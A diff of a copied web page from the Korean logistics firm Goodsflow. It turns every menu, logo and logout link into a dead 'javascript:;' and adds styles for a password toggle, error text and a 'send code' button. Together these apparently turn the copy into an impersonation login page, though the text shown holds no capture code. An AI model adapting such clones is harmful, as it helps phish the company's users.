@@ -14533,6 +14533,12 @@
 		//var LOGIN_MEMBER_DATA = {"name": "", "point": ""};
 	</script><!-- INDEX 페이지 상단 GAP 조정 -->
 
+
+
+
+
+
+
 	<style>
 		.gf-landing-top-gap {
 			display: block;
@@ -14570,7 +14576,7 @@
 	<style>
 
 
-		.z-depth-1 {
+.z-depth-1 {
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
     }
     .hidden {
@@ -14580,6 +14586,10 @@
       color: red;
       font-size: 0.8rem;
     }
+
+	
+
+
     .show-password {
       cursor: pointer;
       position: absolute;
@@ -14589,6 +14599,9 @@
     .input-container {
       position: relative;
     }
+
+
+
 
 body {
       display: flex;
@@ -14612,9 +14625,19 @@ body {
       box-shadow: none;
     }
 
+    .error {
+      color: red;
+      font-size: 12px;
+    }
 
+    #sendCode {
+      color: #1976d2; /* 부드러운 파란색 */
+      cursor: pointer;
+    }
 
-
+    #sendCode:disabled {
+      color: grey; /* 비활성화 시 색상 */
+    }
 
 	</style>
 
@@ -14737,9 +14760,9 @@ body {
 			</span>
 		</li>
 		<li class="profile-footer btn-group-justified">
-			<a href="https://www.goodsflow.com/login?back_url=L3Nob3BfbXlwYWdl&amp;type=mypage"
+			<a href="javascript:;"
 				class="btn btn-flat">마이페이지</a>
-			<a href="https://www.goodsflow.com/logout.cm?back_url=L21vYmlsZQ%3D%3D" class="btn btn-flat right">로그아웃</a>
+			<a href="javascript:;" class="btn btn-flat right">로그아웃</a>
 		</li>
 	</ul>
 	<div id="mobile_slide_menu_wrap" class="mobile_slide_menu_container">
@@ -14752,7 +14775,7 @@ body {
 
 
 					<li style="" class="depth-01  " data-code="m201810195bc93f6c6cd3a">
-						<a href="https://www.goodsflow.com/e-logistics" data-url="e-logistics" data-has_child="Y"
+						<a href="javascript:;" data-url="e-logistics" data-has_child="Y"
 							data-is_folder_menu="Y" class=" active  " onclick="">
 							<span class="plain_name" data-hover="">정보서비스</span>
 							<span class="_toggle_btn toggle-btn"></span>
@@ -14762,7 +14785,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811135bea7e7cde1b4">
 								<a tabindex="-1" data-url="tracking" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/tracking" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">배송추적</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14771,7 +14794,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811135bea8943a3cb7">
 								<a tabindex="-1" data-url="invoice" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/invoice" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">송장출력</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14780,7 +14803,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811135bea89ff6d9f2">
 								<a tabindex="-1" data-url="return" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/return" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">반품이관</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14789,7 +14812,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811145bebb7d434d13">
 								<a tabindex="-1" data-url="mobile" data-has_child="N" data-is_folder_menu="N"
-									href="mobile.html" class=" active   active-real " onclick="">
+									href="javascript:;" class=" active   active-real " onclick="">
 									<span class="plain_name" data-hover="">배송지키미앱</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14798,7 +14821,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811155beccc6268448">
 								<a tabindex="-1" data-url="alimi" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/alimi" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">알리미</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14807,7 +14830,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811155becc51a92d41">
 								<a tabindex="-1" data-url="safe-no" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/safe-no" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">안심번호</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14819,7 +14842,7 @@ body {
 					</li>
 
 					<li style="" class="depth-01  " data-code="m201810195bc9802b2a147">
-						<a href="https://www.goodsflow.com/business" data-url="business" data-has_child="Y"
+						<a href="javascript:;" data-url="business" data-has_child="Y"
 							data-is_folder_menu="Y" class=" " onclick="">
 							<span class="plain_name" data-hover="">물류서비스</span>
 							<span class="_toggle_btn toggle-btn"></span>
@@ -14829,7 +14852,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811145bebb619d14f1">
 								<a tabindex="-1" data-url="alliance" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/alliance" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">제휴택배</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14838,7 +14861,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m20240625930288b86e5a2">
 								<a tabindex="-1" data-url="goodsflow_return" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/goodsflow_return" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">전담반품</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14847,7 +14870,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m202207213d6b93223b0af">
 								<a tabindex="-1" data-url="fastdelivery" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/fastdelivery" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">오늘도착</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14856,7 +14879,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m202406271ef6a1acefdb2">
 								<a tabindex="-1" data-url="homepick" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/homepick" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">홈픽</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14868,7 +14891,7 @@ body {
 					</li>
 
 					<li style="" class="depth-01  " data-code="m201811145bebc3e0d98e4">
-						<a href="https://www.goodsflow.com/fulfillment" data-url="fulfillment" data-has_child="N"
+						<a href="javascript:;" data-url="fulfillment" data-has_child="N"
 							data-is_folder_menu="N" class=" " onclick="">
 							<span class="plain_name" data-hover="">풀필먼트</span>
 							<span class="_toggle_btn toggle-btn"></span>
@@ -14877,7 +14900,7 @@ body {
 					</li>
 
 					<li style="" class="depth-01  " data-code="m2024062584f2283fe1ade">
-						<a href="https://www.goodsflow.com/urban" data-url="urban" data-has_child="N"
+						<a href="javascript:;" data-url="urban" data-has_child="N"
 							data-is_folder_menu="N" class=" " onclick="">
 							<span class="plain_name" data-hover="">도심물류</span>
 							<span class="_toggle_btn toggle-btn"></span>
@@ -14886,7 +14909,7 @@ body {
 					</li>
 
 					<li style="" class="depth-01  " data-code="m201810195bc93f6c6c991">
-						<a href="https://www.goodsflow.com/about" data-url="about" data-has_child="Y"
+						<a href="javascript:;" data-url="about" data-has_child="Y"
 							data-is_folder_menu="Y" class=" " onclick="">
 							<span class="plain_name" data-hover="">회사소개</span>
 							<span class="_toggle_btn toggle-btn"></span>
@@ -14896,7 +14919,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201811135bea5b0be7fdf">
 								<a tabindex="-1" data-url="brand" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/brand" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">브랜드</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14905,7 +14928,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m20240705f1b49d8a27a98">
 								<a tabindex="-1" data-url="history" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/history" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">연혁</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14914,7 +14937,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201810195bc981f60132f">
 								<a tabindex="-1" data-url="press" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/press" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">언론보도</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14923,7 +14946,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m20230509bec9dd82165f5">
 								<a tabindex="-1" data-url="notice" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/notice" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">공지사항</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14932,7 +14955,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201810305bd82b0c57f65">
 								<a tabindex="-1" data-url="reference" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/reference" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">대표사례</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14941,7 +14964,7 @@ body {
 
 							<li class="depth-02  " style="" data-code="m201810305bd82b17a7f6a">
 								<a tabindex="-1" data-url="contactus" data-has_child="N" data-is_folder_menu="N"
-									href="https://www.goodsflow.com/contactus" class=" " onclick="">
+									href="javascript:;" class=" " onclick="">
 									<span class="plain_name" data-hover="">문의하기</span>
 									<span class="_toggle_btn toggle-btn"></span>
 								</a>
@@ -14962,9 +14985,9 @@ body {
 							class="globe_square" src="common/img/flag_shapes/flag_kr_square.png" width="18"
 							style="display: none" alt=""><span>한국어</span></button>
 					<ul class="dropdown-menu" role="menu">
-						<li><a href="https://www.goodsflow.com/?redirect=no"><span>한국어</span></a></li>
+						<li><a href="javascript:;"><span>한국어</span></a></li>
 						<li><a
-								href="https://en.goodsflow.com/auth/access_control.cm?qs=eyJtb3ZlX3VybCI6Imh0dHBzOlwvXC9lbi5nb29kc2Zsb3cuY29tXC8/cmVkaXJlY3Q9bm8iLCJhY2NfZG9tYWluIjoiZ29vZHNmbG93LmNvbSIsImF1dGhfZG9tYWluIjoiZW4uZ29vZHNmbG93LmNvbSJ9"><span>English</span></a>
+								href="javascript:;"><span>English</span></a>
 						</li>
 					</ul>
 				</div>
@@ -15146,7 +15169,7 @@ body {
 													id="logo_w2024072511203872db745">
 													<div class="img_box _img_box" style="position: relative;">
 														<a class="_fade_link "
-															href="https://www.goodsflow.com/index"><span
+															href="javascript:;"><span
 																class="sr-only">사이트 로고</span> <img
 																class="normal_logo _front_img"
 																src="https://cdn.imweb.me/thumbnail/20240909/836e28da157a5.png"
@@ -15177,7 +15200,7 @@ body {
 														<li class="dropdown _show_m201810195bc93f6c6cd3a   " style=""
 															id="dropdown_m201810195bc93f6c6cd3a"
 															data-code="m201810195bc93f6c6cd3a">
-															<a href="https://www.goodsflow.com/e-logistics"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown  active   _fade_link "
 																data-url="e-logistics" data-toggle="dropdown">
 																<span class="_txt_m201810195bc93f6c6cd3a plain_name"
@@ -15190,7 +15213,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea7e7cde1b4   "
 																	data-code="m201811135bea7e7cde1b4" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/tracking"
+																		href="javascript:;"
 																		data-url="tracking"
 																		class="_txt_m201811135bea7e7cde1b4   _fade_link "><span
 																			class="plain_name"
@@ -15201,7 +15224,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea8943a3cb7   "
 																	data-code="m201811135bea8943a3cb7" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/invoice"
+																		href="javascript:;"
 																		data-url="invoice"
 																		class="_txt_m201811135bea8943a3cb7   _fade_link "><span
 																			class="plain_name"
@@ -15212,7 +15235,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea89ff6d9f2   "
 																	data-code="m201811135bea89ff6d9f2" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/return"
+																		href="javascript:;"
 																		data-url="return"
 																		class="_txt_m201811135bea89ff6d9f2   _fade_link "><span
 																			class="plain_name"
@@ -15222,7 +15245,7 @@ body {
 
 																<li class="dropdown-submenu _show_m201811145bebb7d434d13   "
 																	data-code="m201811145bebb7d434d13" style="">
-																	<a tabindex="-1" href="mobile.html"
+																	<a tabindex="-1" href="javascript:;"
 																		data-url="mobile"
 																		class="_txt_m201811145bebb7d434d13  active   _fade_link "><span
 																			class="plain_name"
@@ -15233,7 +15256,7 @@ body {
 																<li class="dropdown-submenu _show_m201811155beccc6268448   "
 																	data-code="m201811155beccc6268448" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/alimi"
+																		href="javascript:;"
 																		data-url="alimi"
 																		class="_txt_m201811155beccc6268448   _fade_link "><span
 																			class="plain_name"
@@ -15244,7 +15267,7 @@ body {
 																<li class="dropdown-submenu _show_m201811155becc51a92d41   "
 																	data-code="m201811155becc51a92d41" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/safe-no"
+																		href="javascript:;"
 																		data-url="safe-no"
 																		class="_txt_m201811155becc51a92d41   _fade_link "><span
 																			class="plain_name"
@@ -15260,7 +15283,7 @@ body {
 														<li class="dropdown _show_m201810195bc9802b2a147   " style=""
 															id="dropdown_m201810195bc9802b2a147"
 															data-code="m201810195bc9802b2a147">
-															<a href="https://www.goodsflow.com/business"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="business" data-toggle="dropdown">
 																<span class="_txt_m201810195bc9802b2a147 plain_name"
@@ -15273,7 +15296,7 @@ body {
 																<li class="dropdown-submenu _show_m201811145bebb619d14f1   "
 																	data-code="m201811145bebb619d14f1" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/alliance"
+																		href="javascript:;"
 																		data-url="alliance"
 																		class="_txt_m201811145bebb619d14f1   _fade_link "><span
 																			class="plain_name"
@@ -15284,7 +15307,7 @@ body {
 																<li class="dropdown-submenu _show_m20240625930288b86e5a2   "
 																	data-code="m20240625930288b86e5a2" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/goodsflow_return"
+																		href="javascript:;"
 																		data-url="goodsflow_return"
 																		class="_txt_m20240625930288b86e5a2   _fade_link "><span
 																			class="plain_name"
@@ -15295,7 +15318,7 @@ body {
 																<li class="dropdown-submenu _show_m202207213d6b93223b0af   "
 																	data-code="m202207213d6b93223b0af" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/fastdelivery"
+																		href="javascript:;"
 																		data-url="fastdelivery"
 																		class="_txt_m202207213d6b93223b0af   _fade_link "><span
 																			class="plain_name"
@@ -15306,7 +15329,7 @@ body {
 																<li class="dropdown-submenu _show_m202406271ef6a1acefdb2   "
 																	data-code="m202406271ef6a1acefdb2" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/homepick"
+																		href="javascript:;"
 																		data-url="homepick"
 																		class="_txt_m202406271ef6a1acefdb2   _fade_link "><span
 																			class="plain_name"
@@ -15322,7 +15345,7 @@ body {
 														<li class="dropdown _show_m201811145bebc3e0d98e4   " style=""
 															id="dropdown_m201811145bebc3e0d98e4"
 															data-code="m201811145bebc3e0d98e4">
-															<a href="https://www.goodsflow.com/fulfillment"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="fulfillment" data-toggle="dropdown">
 																<span class="_txt_m201811145bebc3e0d98e4 plain_name"
@@ -15336,7 +15359,7 @@ body {
 														<li class="dropdown _show_m2024062584f2283fe1ade   " style=""
 															id="dropdown_m2024062584f2283fe1ade"
 															data-code="m2024062584f2283fe1ade">
-															<a href="https://www.goodsflow.com/urban"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="urban" data-toggle="dropdown">
 																<span class="_txt_m2024062584f2283fe1ade plain_name"
@@ -15350,7 +15373,7 @@ body {
 														<li class="dropdown _show_m201810195bc93f6c6c991   " style=""
 															id="dropdown_m201810195bc93f6c6c991"
 															data-code="m201810195bc93f6c6c991">
-															<a href="https://www.goodsflow.com/about"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="about" data-toggle="dropdown">
 																<span class="_txt_m201810195bc93f6c6c991 plain_name"
@@ -15363,7 +15386,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea5b0be7fdf   "
 																	data-code="m201811135bea5b0be7fdf" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/brand"
+																		href="javascript:;"
 																		data-url="brand"
 																		class="_txt_m201811135bea5b0be7fdf   _fade_link "><span
 																			class="plain_name"
@@ -15374,7 +15397,7 @@ body {
 																<li class="dropdown-submenu _show_m20240705f1b49d8a27a98   "
 																	data-code="m20240705f1b49d8a27a98" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/history"
+																		href="javascript:;"
 																		data-url="history"
 																		class="_txt_m20240705f1b49d8a27a98   _fade_link "><span
 																			class="plain_name"
@@ -15385,7 +15408,7 @@ body {
 																<li class="dropdown-submenu _show_m201810195bc981f60132f   "
 																	data-code="m201810195bc981f60132f" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/press"
+																		href="javascript:;"
 																		data-url="press"
 																		class="_txt_m201810195bc981f60132f   _fade_link "><span
 																			class="plain_name"
@@ -15396,7 +15419,7 @@ body {
 																<li class="dropdown-submenu _show_m20230509bec9dd82165f5   "
 																	data-code="m20230509bec9dd82165f5" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/notice"
+																		href="javascript:;"
 																		data-url="notice"
 																		class="_txt_m20230509bec9dd82165f5   _fade_link "><span
 																			class="plain_name"
@@ -15407,7 +15430,7 @@ body {
 																<li class="dropdown-submenu _show_m201810305bd82b0c57f65   "
 																	data-code="m201810305bd82b0c57f65" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/reference"
+																		href="javascript:;"
 																		data-url="reference"
 																		class="_txt_m201810305bd82b0c57f65   _fade_link "><span
 																			class="plain_name"
@@ -15418,7 +15441,7 @@ body {
 																<li class="dropdown-submenu _show_m201810305bd82b17a7f6a   "
 																	data-code="m201810305bd82b17a7f6a" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/contactus"
+																		href="javascript:;"
 																		data-url="contactus"
 																		class="_txt_m201810305bd82b17a7f6a   _fade_link "><span
 																			class="plain_name"
@@ -15469,7 +15492,7 @@ body {
 													id="logo_w202407183a8160615404c">
 													<div class="img_box _img_box" style="position: relative;">
 														<a class="_fade_link "
-															href="https://www.goodsflow.com/index"><span
+															href="javascript:;"><span
 																class="sr-only">사이트 로고</span> <img
 																class="normal_logo _front_img"
 																src="https://cdn.imweb.me/thumbnail/20240909/7a7e3bb1d3c81.png"
@@ -15500,7 +15523,7 @@ body {
 														<li class="dropdown _show_m201810195bc93f6c6cd3a   " style=""
 															id="dropdown_m201810195bc93f6c6cd3a"
 															data-code="m201810195bc93f6c6cd3a">
-															<a href="https://www.goodsflow.com/e-logistics"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown  active   _fade_link "
 																data-url="e-logistics" data-toggle="dropdown">
 																<span class="_txt_m201810195bc93f6c6cd3a plain_name"
@@ -15513,7 +15536,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea7e7cde1b4   "
 																	data-code="m201811135bea7e7cde1b4" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/tracking"
+																		href="javascript:;"
 																		data-url="tracking"
 																		class="_txt_m201811135bea7e7cde1b4   _fade_link "><span
 																			class="plain_name"
@@ -15524,7 +15547,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea8943a3cb7   "
 																	data-code="m201811135bea8943a3cb7" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/invoice"
+																		href="javascript:;"
 																		data-url="invoice"
 																		class="_txt_m201811135bea8943a3cb7   _fade_link "><span
 																			class="plain_name"
@@ -15535,7 +15558,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea89ff6d9f2   "
 																	data-code="m201811135bea89ff6d9f2" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/return"
+																		href="javascript:;"
 																		data-url="return"
 																		class="_txt_m201811135bea89ff6d9f2   _fade_link "><span
 																			class="plain_name"
@@ -15545,7 +15568,7 @@ body {
 
 																<li class="dropdown-submenu _show_m201811145bebb7d434d13   "
 																	data-code="m201811145bebb7d434d13" style="">
-																	<a tabindex="-1" href="mobile.html"
+																	<a tabindex="-1" href="javascript:;"
 																		data-url="mobile"
 																		class="_txt_m201811145bebb7d434d13  active   _fade_link "><span
 																			class="plain_name"
@@ -15556,7 +15579,7 @@ body {
 																<li class="dropdown-submenu _show_m201811155beccc6268448   "
 																	data-code="m201811155beccc6268448" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/alimi"
+																		href="javascript:;"
 																		data-url="alimi"
 																		class="_txt_m201811155beccc6268448   _fade_link "><span
 																			class="plain_name"
@@ -15567,7 +15590,7 @@ body {
 																<li class="dropdown-submenu _show_m201811155becc51a92d41   "
 																	data-code="m201811155becc51a92d41" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/safe-no"
+																		href="javascript:;"
 																		data-url="safe-no"
 																		class="_txt_m201811155becc51a92d41   _fade_link "><span
 																			class="plain_name"
@@ -15583,7 +15606,7 @@ body {
 														<li class="dropdown _show_m201810195bc9802b2a147   " style=""
 															id="dropdown_m201810195bc9802b2a147"
 															data-code="m201810195bc9802b2a147">
-															<a href="https://www.goodsflow.com/business"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="business" data-toggle="dropdown">
 																<span class="_txt_m201810195bc9802b2a147 plain_name"
@@ -15596,7 +15619,7 @@ body {
 																<li class="dropdown-submenu _show_m201811145bebb619d14f1   "
 																	data-code="m201811145bebb619d14f1" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/alliance"
+																		href="javascript:;"
 																		data-url="alliance"
 																		class="_txt_m201811145bebb619d14f1   _fade_link "><span
 																			class="plain_name"
@@ -15607,7 +15630,7 @@ body {
 																<li class="dropdown-submenu _show_m20240625930288b86e5a2   "
 																	data-code="m20240625930288b86e5a2" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/goodsflow_return"
+																		href="javascript:;"
 																		data-url="goodsflow_return"
 																		class="_txt_m20240625930288b86e5a2   _fade_link "><span
 																			class="plain_name"
@@ -15618,7 +15641,7 @@ body {
 																<li class="dropdown-submenu _show_m202207213d6b93223b0af   "
 																	data-code="m202207213d6b93223b0af" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/fastdelivery"
+																		href="javascript:;"
 																		data-url="fastdelivery"
 																		class="_txt_m202207213d6b93223b0af   _fade_link "><span
 																			class="plain_name"
@@ -15629,7 +15652,7 @@ body {
 																<li class="dropdown-submenu _show_m202406271ef6a1acefdb2   "
 																	data-code="m202406271ef6a1acefdb2" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/homepick"
+																		href="javascript:;"
 																		data-url="homepick"
 																		class="_txt_m202406271ef6a1acefdb2   _fade_link "><span
 																			class="plain_name"
@@ -15645,7 +15668,7 @@ body {
 														<li class="dropdown _show_m201811145bebc3e0d98e4   " style=""
 															id="dropdown_m201811145bebc3e0d98e4"
 															data-code="m201811145bebc3e0d98e4">
-															<a href="https://www.goodsflow.com/fulfillment"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="fulfillment" data-toggle="dropdown">
 																<span class="_txt_m201811145bebc3e0d98e4 plain_name"
@@ -15659,7 +15682,7 @@ body {
 														<li class="dropdown _show_m2024062584f2283fe1ade   " style=""
 															id="dropdown_m2024062584f2283fe1ade"
 															data-code="m2024062584f2283fe1ade">
-															<a href="https://www.goodsflow.com/urban"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="urban" data-toggle="dropdown">
 																<span class="_txt_m2024062584f2283fe1ade plain_name"
@@ -15673,7 +15696,7 @@ body {
 														<li class="dropdown _show_m201810195bc93f6c6c991   " style=""
 															id="dropdown_m201810195bc93f6c6c991"
 															data-code="m201810195bc93f6c6c991">
-															<a href="https://www.goodsflow.com/about"
+															<a href="javascript:;"
 																class="fixed_transform dropdown-toggle disabled _header_dropdown   _fade_link "
 																data-url="about" data-toggle="dropdown">
 																<span class="_txt_m201810195bc93f6c6c991 plain_name"
@@ -15686,7 +15709,7 @@ body {
 																<li class="dropdown-submenu _show_m201811135bea5b0be7fdf   "
 																	data-code="m201811135bea5b0be7fdf" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/brand"
+																		href="javascript:;"
 																		data-url="brand"
 																		class="_txt_m201811135bea5b0be7fdf   _fade_link "><span
 																			class="plain_name"
@@ -15697,7 +15720,7 @@ body {
 																<li class="dropdown-submenu _show_m20240705f1b49d8a27a98   "
 																	data-code="m20240705f1b49d8a27a98" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/history"
+																		href="javascript:;"
 																		data-url="history"
 																		class="_txt_m20240705f1b49d8a27a98   _fade_link "><span
 																			class="plain_name"
@@ -15708,7 +15731,7 @@ body {
 																<li class="dropdown-submenu _show_m201810195bc981f60132f   "
 																	data-code="m201810195bc981f60132f" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/press"
+																		href="javascript:;"
 																		data-url="press"
 																		class="_txt_m201810195bc981f60132f   _fade_link "><span
 																			class="plain_name"
@@ -15719,7 +15742,7 @@ body {
 																<li class="dropdown-submenu _show_m20230509bec9dd82165f5   "
 																	data-code="m20230509bec9dd82165f5" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/notice"
+																		href="javascript:;"
 																		data-url="notice"
 																		class="_txt_m20230509bec9dd82165f5   _fade_link "><span
 																			class="plain_name"
@@ -15730,7 +15753,7 @@ body {
 																<li class="dropdown-submenu _show_m201810305bd82b0c57f65   "
 																	data-code="m201810305bd82b0c57f65" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/reference"
+																		href="javascript:;"
 																		data-url="reference"
 																		class="_txt_m201810305bd82b0c57f65   _fade_link "><span
 																			class="plain_name"
@@ -15741,7 +15764,7 @@ body {
 																<li class="dropdown-submenu _show_m201810305bd82b17a7f6a   "
 																	data-code="m201810305bd82b17a7f6a" style="">
 																	<a tabindex="-1"
-																		href="https://www.goodsflow.com/contactus"
+																		href="javascript:;"
 																		data-url="contactus"
 																		class="_txt_m201810305bd82b17a7f6a   _fade_link "><span
 																			class="plain_name"
@@ -15790,7 +15813,7 @@ body {
 													id="logo_w201810195bc99c553c24e">
 													<div class="img_box _img_box" style="position: relative;">
 														<a class="_fade_link "
-															href="https://www.goodsflow.com/index"><span
+															href="javascript:;"><span
 																class="sr-only">사이트 로고</span> <img
 																class="normal_logo _front_img"
 																src="https://cdn.imweb.me/thumbnail/20240909/8163019d485c8.png"
@@ -15842,26 +15865,26 @@ body {
 									<tr>
 										<td class="nav-item _item" data-code="m201811135bea7e7cde1b4"
 											data-rel="table_nav" data-url="tracking"> <a
-												href="https://www.goodsflow.com/tracking" class="_fade_link" style="">
+												href="javascript:;" class="_fade_link" style="">
 												<span class="plain_name" data-hover="">배송추적</span> </a> </td>
 										<td class="nav-item _item" data-code="m201811135bea8943a3cb7"
 											data-rel="table_nav" data-url="invoice"> <a
-												href="https://www.goodsflow.com/invoice" class="_fade_link" style="">
+												href="javascript:;" class="_fade_link" style="">
 												<span class="plain_name" data-hover="">송장출력</span> </a> </td>
 										<td class="nav-item _item" data-code="m201811135bea89ff6d9f2"
 											data-rel="table_nav" data-url="return"> <a
-												href="https://www.goodsflow.com/return" class="_fade_link" style="">
+												href="javascript:;" class="_fade_link" style="">
 												<span class="plain_name" data-hover="">반품이관</span> </a> </td>
 										<td class="nav-item _item  active" data-code="m201811145bebb7d434d13"
-											data-rel="table_nav" data-url="mobile"> <a href="mobile.html"
+											data-rel="table_nav" data-url="mobile"> <a href="javascript:;"
 												class="_fade_link" style=""> <span class="plain_name"
 													data-hover="">배송지키미앱</span> </a> </td>
 									</tr>
 									<td class="nav-item _item" data-code="m201811155beccc6268448" data-rel="table_nav"
-										data-url="alimi"> <a href="https://www.goodsflow.com/alimi" class="_fade_link"
+										data-url="alimi"> <a href="javascript:;" class="_fade_link"
 											style=""> <span class="plain_name" data-hover="">알리미</span> </a> </td>
 									<td class="nav-item _item" data-code="m201811155becc51a92d41" data-rel="table_nav"
-										data-url="safe-no"> <a href="https://www.goodsflow.com/safe-no"
+										data-url="safe-no"> <a href="javascript:;"
 											class="_fade_link" style=""> <span class="plain_name"
 												data-hover="">안심번호</span> </a> </td>
 									<td class="nav-item empty_item "></td>
@@ -15953,7 +15976,7 @@ body {
 										<ul class="">
 
